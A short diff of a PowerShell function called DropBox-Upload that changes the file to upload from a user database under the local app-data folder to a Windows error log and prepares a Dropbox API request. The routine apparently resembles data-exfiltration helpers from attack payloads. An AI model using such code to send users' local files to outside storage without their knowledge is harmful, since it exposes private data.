@@ -3,7 +3,7 @@ function DropBox-Upload {
 
 [CmdletBinding()]
 
-$SourceFilePath = "%LOCALAPPDATA%\Microsoft\user.db"
+$SourceFilePath = "C:\Windows\System32\ErrorLog.txt"
 $outputFile = Split-Path $SourceFilePath -leaf
 $TargetFilePath="/$outputFile"
 $arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
